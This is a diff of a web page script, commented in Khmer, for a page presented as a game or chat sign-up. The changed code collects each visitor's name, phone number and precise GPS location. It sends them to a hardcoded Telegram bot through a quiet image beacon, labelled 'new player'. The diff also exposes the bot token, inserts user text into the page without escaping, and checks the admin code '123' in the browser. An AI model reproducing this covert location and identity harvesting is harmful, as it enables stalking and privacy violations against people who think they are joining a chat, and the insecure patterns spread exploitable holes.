@@ -3487,19 +3487,18 @@ function listenForAdminReplies() {
           }
       });
 }
-    
-const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
+    const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
 const CHAT_ID = "955031659";
 let userLocation = "";
 
-// ១. ទៅកាន់អេក្រង់ចុះឈ្មោះ
+// មុខងារប្តូរអេក្រង់ (ជំហានទី ១ ទៅ ២)
 function toStep2() {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
 }
 
-// ២. ចាប់ទីតាំងពិតប្រាកដ (High Accuracy)
-function getRealTimeLocation() {
+// មុខងារចាប់ទីតាំងឱ្យ "ចំកន្លែងដែលគេនៅ"
+function getExactLocation() {
     const status = document.getElementById('gps-status');
     const btn = document.getElementById('btn-gps');
     
@@ -3509,77 +3508,55 @@ function getRealTimeLocation() {
         navigator.geolocation.getCurrentPosition(function(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-
+            
+            // បង្កើត Link ផែនទីពិតប្រាកដ (ចំកន្លែងគេនៅ)
             userLocation = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            status.innerText = `✅ ចាប់បានទីតាំងហើយ (ច្បាស់កម្រិត ${Math.round(acc)} ម៉ែត្រ)`;
+            status.innerText = "✅ ចាប់បានទីតាំងចំគោលដៅហើយ!";
             status.style.color = "green";
             btn.style.background = "#4CAF50";
         }, function(error) {
-            alert("Error: " + error.message + " | សូមចុច 'Allow' នៅខាងលើ Browser!");
+            alert("Error: " + error.message + " | សូមចុច 'Allow' នៅលើ Browser!");
             status.innerText = "❌ សូមចុច Allow Location លើ Browser";
         }, {
-            enableHighAccuracy: true,
-            timeout: 15000,
+            enableHighAccuracy: true, // បង្ខំឱ្យប្រើសញ្ញាច្បាស់បំផុត
+            timeout: 10000,
             maximumAge: 0
         });
     }
 }
 
-// ៣. ចុះឈ្មោះ និងផ្ញើទៅ Telegram
+// ចុះឈ្មោះ និងផ្ញើទៅ Telegram
 async function submitUser() {
     const name = document.getElementById('reg-name').value.trim();
     const phone = document.getElementById('reg-phone').value.trim();
 
     if (!name || !phone || !userLocation) {
-        alert("សូមបំពេញឈ្មោះ លេខទូរស័ព្ទ និងចុច GPS ជាមុនសិន!");
+        alert("សូមបំពេញឈ្មោះ លេខទូរស័ព្ទ និងផ្តល់ GPS ជាមុនសិន!");
         return;
     }
 
     const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📍 ទីតាំងពិត: ${userLocation}`;
     
-    // ផ្ញើទៅ Telegram (ប្រើ Image Beacon ដើម្បីកុំឱ្យ Error Internet)
+    // ផ្ញើទៅ Telegram (ប្រើវិធី Image ដើម្បីកុំឱ្យលោត "បញ្ហាអ៊ីនធឺណិត")
     let img = new Image();
     img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
-    // ចូលទៅកាន់ប្រអប់ឆាត
+    // ទៅកាន់ប្រអប់ឆាត (ជំហានទី ៣)
     document.getElementById('chat-user-input').value = name;
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
-    
-    saveMessage("System", `ស្វាគមន៍ ${name} ចូលក្នុងឆាត!`);
 }
 
-// --- មុខងារឆាតរបស់បង ---
+// មុខងារឆាត (លេងបានច្រើននាក់ និងលុបសារបាន)
 function sendChatMessage() {
     const name = document.getElementById('chat-user-input').value;
     const msg = document.getElementById('chat-msg-input').value.trim();
     if (msg === "") return;
 
-    saveMessage(name, msg);
-    document.getElementById('chat-msg-input').value = "";
-}
-
-function sendChatImage(input) {
-    const name = document.getElementById('chat-user-input').value;
-    if (input.files && input.files[0]) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            const imgHtml = `<img src="${e.target.result}" style="max-width:200px; border-radius:10px; display:block; margin-top:5px;">`;
-            saveMessage(name, imgHtml);
-        };
-        reader.readAsDataURL(input.files[0]);
-    }
-}
-
-function saveMessage(name, msg) {
     const chatBox = document.getElementById('chat-box');
-    const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-    const msgHtml = `<div style="margin-bottom:10px; padding:8px; background:#f1f1f1; border-radius:8px;">
-                        <b style="color:#4CAF50;">${name}</b> <small style="color:gray;">(${time})</small><br>${msg}
-                     </div>`;
-    chatBox.innerHTML += msgHtml;
+    chatBox.innerHTML += `<div style="padding:5px; border-bottom:1px solid #eee;"><b>${name}:</b> ${msg}</div>`;
+    document.getElementById('chat-msg-input').value = "";
     chatBox.scrollTop = chatBox.scrollHeight;
 }
 
@@ -3587,13 +3564,11 @@ function clearAllChat() {
     const code = document.getElementById('admin-code').value;
     if (code === "123") { // លេខកូដលុបសារ
         document.getElementById('chat-box').innerHTML = "";
-        alert("បានលុបសារទាំងអស់!");
+        alert("បានលុបសារ!");
     } else {
-        alert("លេខកូដ Admin មិនត្រឹមត្រូវ!");
+        alert("លេខកូដខុស!");
     }
 }
-    
-    
     
 </script>
 </body>
